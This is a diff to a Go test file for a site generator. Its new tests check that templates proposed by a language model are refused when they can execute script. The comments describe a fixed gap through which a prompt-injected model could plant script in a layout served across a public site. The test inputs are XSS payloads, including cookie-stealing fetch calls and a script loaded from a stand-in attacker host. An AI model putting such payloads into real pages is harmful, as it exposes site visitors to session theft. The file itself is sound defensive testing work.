@@ -166,3 +166,76 @@ func TestEmptyProposalIsRefused(t *testing.T) {
 		t.Fatal("an empty proposal is not a change")
 	}
 }
+
+// A model cannot put script in a template, and this used to be possible.
+//
+// The gap was between the two ways foreign template text reaches the store.
+// `quilzo template adopt` strips script, inline handlers and executable URL
+// schemes and reports what it took out, because a template from another system
+// is untrusted markup. A proposal from a model is untrusted markup by the same
+// reasoning — the package comment above says every byte it returns is treated
+// like a request body from the internet — but Validate checked it for
+// {% raw %} and nothing else.
+//
+// So a prompt-injected model could put a <script> element in a layout, and
+// because a layout renders on every page using it, that reached the whole
+// public site. Only Content-Security-Policy stopped it running. That is defence
+// in depth doing its job, and it is not the same as the control being there:
+// script-src 'none' is one header away from an operator who needs an exception
+// for one page, and the argument for that header is that the site has no
+// scripts rather than that it has some the CSP catches.
+func TestAModelCannotPutScriptInATemplate(t *testing.T) {
+	for name, src := range map[string]string{
+		"a script element":   `<h1>{{ page.title }}</h1><script>fetch("//x/"+document.cookie)</script>`,
+		"a script reference": `<script src="https://evil.example/x.js"></script>`,
+		"an inline handler":  `<button onclick="fetch('//x/'+document.cookie)">go</button>`,
+		"an image handler":   `<img src="/none.png" onerror="alert(1)">`,
+		"a javascript url":   `<a href="javascript:alert(1)">{{ page.title }}</a>`,
+	} {
+		t.Run(name, func(t *testing.T) {
+			reply := jsonReply(t, Proposal{
+				Pages:     map[string]any{"home": map[string]any{"title": "Home"}},
+				Templates: map[string]string{"page.html": src},
+			})
+			_, err := ParseProposal(reply)
+			if err == nil {
+				t.Fatalf("accepted a template that can execute: %s", src)
+			}
+			// The reviewer reads this. A refusal that does not say what was
+			// found is a refusal somebody works around by guessing.
+			if !strings.Contains(err.Error(), "can execute") {
+				t.Errorf("the refusal does not say the template can execute: %q", err)
+			}
+			if !strings.Contains(err.Error(), "script-src 'none'") {
+				t.Errorf("the refusal does not say why this site has no "+
+					"scripts: %q", err)
+			}
+		})
+	}
+}
+
+// The refusal is not so broad that it refuses templates.
+//
+// A check on generated markup that fires on ordinary markup gets switched off,
+// and then the real one is gone too. Every template here is one the assistant
+// is expected to be able to write.
+func TestAModelCanStillWriteAnOrdinaryTemplate(t *testing.T) {
+	for name, src := range map[string]string{
+		"a page":           `<h1>{{ page.title }}</h1><p>{{ page.body }}</p>`,
+		"a loop and links": `{% for p in pages %}<a href="/{{ p.name }}">{{ p.title }}</a>{% end %}`,
+		"an outbound link": `<p><a href="https://example.com/reading">further reading</a></p>`,
+		"an image":         `<img src="/media/cloth.avif" alt="{{ page.alt }}">`,
+		"a stylesheet":     `<link rel="stylesheet" href="/site.css"><h1>{{ page.title }}</h1>`,
+		"prose about on":   `<p>The online workshop is on Monday.</p>`,
+	} {
+		t.Run(name, func(t *testing.T) {
+			reply := jsonReply(t, Proposal{
+				Pages:     map[string]any{"home": map[string]any{"title": "Home"}},
+				Templates: map[string]string{"page.html": src},
+			})
+			if _, err := ParseProposal(reply); err != nil {
+				t.Errorf("refused an ordinary template: %v\n  in: %s", err, src)
+			}
+		})
+	}
+}
